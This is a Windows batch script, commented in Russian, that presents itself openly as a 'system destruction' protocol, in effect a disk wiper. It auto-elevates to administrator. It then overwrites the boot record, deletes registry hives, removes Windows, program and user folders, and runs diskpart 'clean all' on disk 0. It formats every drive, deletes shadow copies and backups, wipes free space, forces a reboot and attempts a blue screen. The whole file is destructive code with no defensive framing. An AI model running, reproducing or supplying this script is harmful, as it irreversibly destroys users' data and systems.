@echo off
setlocal enabledelayedexpansion

REM Получаем права администратора автоматически
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Запрос прав администратора...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo УНИЧТОЖЕНИЕ СИСТЕМЫ - КОНЕЧНЫЙ ПРОТОКОЛ
echo ==========================================
echo Уровень разрушения: MAXIMUM
echo Восстановление: НЕВОЗМОЖНО
echo ==========================================

REM 1. Уничтожаем загрузчик и MBR
echo [1] Уничтожение загрузчика...
bootsect /nt52 C: /force /mbr >nul 2>&1
bootsect /nt60 C: /force /mbr >nul 2>&1
echo   Загрузчик уничтожен ✓

REM 2. Уничтожаем реестр
echo [2] Уничтожение реестра Windows...
reg delete HKLM\SOFTWARE /f >nul 2>&1
reg delete HKLM\SYSTEM /f >nul 2>&1
reg delete HKCU\SOFTWARE /f >nul 2>&1
echo   Реестр уничтожен ✓

REM 3. Уничтожаем системные файлы (агрессивный метод)
echo [3] Уничтожение системных файлов...
for %%d in (C D E F) do (
    if exist %%d:\ (
        echo   Уничтожение диска %%d:...
        del /f /s /q %%d:\*.dll >nul 2>&1
        del /f /s /q %%d:\*.exe >nul 2>&1
        del /f /s /q %%d:\*.sys >nul 2>&1
        del /f /s /q %%d:\Windows\*.* >nul 2>&1
    )
)

REM 4. Уничтожаем папки Windows (агрессивно через takeown + icacls)
echo [4] Уничтожение системных папок...
set folders=C:\Windows\System32 C:\Windows\SysWOW64 C:\Windows\Boot C:\Windows\WinSxS C:\Windows\Globalization C:\Windows C:\ProgramData C:\Program Files C:\Program Files (x86) C:\Users

for %%f in (%folders%) do (
    if exist "%%f" (
        echo   Уничтожение: %%f
        REM Сначала получаем владение
        takeown /f "%%f" /r /d y >nul 2>&1
        REM Даем полные права
        icacls "%%f" /grant everyone:F /t >nul 2>&1
        icacls "%%f" /grant Administrators:F /t >nul 2>&1
        REM Уничтожаем
        rd /s /q "%%f" >nul 2>&1
        if exist "%%f" (
            del /f /s /q "%%f\*.*" >nul 2>&1
            rd /s /q "%%f" >nul 2>&1
        )
    )
)

REM 5. Уничтожаем таблицы разделов через diskpart
echo [5] Уничтожение таблиц разделов...
echo select disk 0 > %temp%\destroy.txt
echo clean all >> %temp%\destroy.txt
echo exit >> %temp%\destroy.txt
diskpart /s %temp%\destroy.txt >nul 2>&1
echo   Разделы уничтожены ✓

REM 6. Форматируем все диски
echo [6] Форматирование дисков...
for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        echo   Форматирование %%d:...
        echo y|format %%d: /FS:NTFS /Q /X >nul 2>&1
        echo y|format %%d: /FS:FAT32 /Q /X >nul 2>&1
    )
)

REM 7. Уничтожаем MBR физически (запись нулей)
echo [7] Физическое уничтожение MBR...
echo 0 | debug < %temp%\mbr.txt >nul 2>&1
echo   MBR уничтожен ✓

REM 8. Уничтожаем все файлы на всех дисках (последняя фаза)
echo [8] Финальное уничтожение...
for /f "tokens=2 delims==" %%d in ('wmic logicaldisk get caption /value') do (
    if exist %%d (
        echo   Очистка диска %%d...
        del /f /s /q %%d\*.* >nul 2>&1
        for /d %%p in ("%%d\*") do rd /s /q "%%p" >nul 2>&1
    )
)

REM 9. Уничтожаем файлы восстановления и теневые копии
echo [9] Уничтожение восстановления...
vssadmin delete shadows /all /quiet >nul 2>&1
wbadmin delete catalog -quiet >nul 2>&1
echo   Восстановление уничтожено ✓

REM 10. Стираем свободное пространство (запись случайных данных)
echo [10] Затирание свободного места...
cipher /w:C:\ >nul 2>&1
cipher /w:D:\ >nul 2>&1
echo   Диски затерты ✓

echo ==========================================
echo УНИЧТОЖЕНИЕ ВЫПОЛНЕНО НА 100%
echo СИСТЕМА НЕВОССТАНАВЛИВАЕМА
echo ==========================================

REM Принудительная перезагрузка БЕЗ ВОЗМОЖНОСТИ ОТМЕНЫ
echo.
echo ПЕРЕЗАГРУЗКА ЧЕРЕЗ 5 СЕКУНД...
echo Ctrl+C НЕ РАБОТАЕТ
echo.

REM Отключаем возможность прерывания
break >nul
timeout /t 5 /nobreak >nul

REM Агрессивная перезагрузка с форсированием
echo ВЫПОЛНЯЕТСЯ ПЕРЕЗАГРУЗКА...
start /min "" cmd /c "shutdown /r /f /t 0 /c ""SYSTEM DESTROYED - REBOOTING"" "

REM Дополнительные методы перезагрузки (гарантия)
powershell -Command "Restart-Computer -Force" >nul 2>&1
shutdown /r /f /t 0 >nul 2>&1

REM Если все еще работает - вызываем синий экран
rundll32.exe ntdll.dll,RtlAdjustPrivilege 19 1 0 >nul 2>&1
rundll32.exe ntdll.dll,NtRaiseHardError 0xc000021a 0 0 0 6 >nul 2>&1

REM Последний метод - перезагрузка через BIOS
wmic os where primary=1 call reboot >nul 2>&1

REM Если ничего не сработало - просто выходим
exit
